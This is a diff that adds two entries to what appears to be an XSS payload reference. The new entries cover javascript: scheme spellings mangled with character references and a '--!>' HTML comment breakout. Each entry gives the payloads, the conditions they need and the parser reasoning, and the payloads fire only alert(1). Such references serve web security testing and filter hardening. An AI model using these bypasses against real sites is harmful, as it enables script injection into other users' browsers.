@@ -59,3 +59,18 @@
 - Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
 - Case: Use the javascript: protocol in a button formaction attribute. Requires user click to execute
 - Output: <form><button formaction=javascript:alert(1)>XSS
+
+---
+
+9. XSS with Entity-Mangled javascript: Scheme
+- Payload: <a href="java&Tab;script:alert(1)">X</a>  |  <a href="javascript&colon;alert(1)">X</a>  |  <a href="java&#10;script:alert(1)">X</a>
+- Condition: Input reflected into a URL attribute (`href`/`src`/`action`) OR injected as a tag; the literal `javascript:` needle is filtered but char-references decode inside the attribute value
+- Case: Character references are decoded while the attribute value is tokenized — BEFORE the URL parser sees it. `&Tab;`/`&#9;`/`&#10;`/`&NewLine;` decode to TAB/LF which the URL parser strips inside a scheme (`java<TAB>script:` -> `javascript:`), and `&colon;`/`&#58;`/`&#x3a;` decode to `:` completing the scheme. Gates: named_tab/entity_tab/named_nl/entity_nl for the in-scheme break, named_colon/char_ref/hex_ref for the colon. The same forms work inside `location="…"` navigation sinks when `location=` and quotes survive.
+- Verified: Chromium — all three spellings execute `alert(1)` on click/navigation.
+
+10. Abrupt HTML Comment Close `--!>` Breakout
+- Payload: --!><svg onload=alert(1)>   (input reflected inside `<!-- … -->`)
+- Condition: `<!--` comment context; `-` `!` `>` survive
+- Case: HTML Standard tokenizer — the "abrupt closing of empty comment" grammar accepts `--!>` as a comment end (browsers are lenient), so the SVG after it parses as markup. Requires only `-` `!` `>`; cheaper than `-->` when `-->` literal is filtered but the chars individually survive… and an alternative when `>` follows `--!` verbatim.
+- Verified: Chromium — `<!-- --!><svg onload=alert(1)>` fires `1`.
+
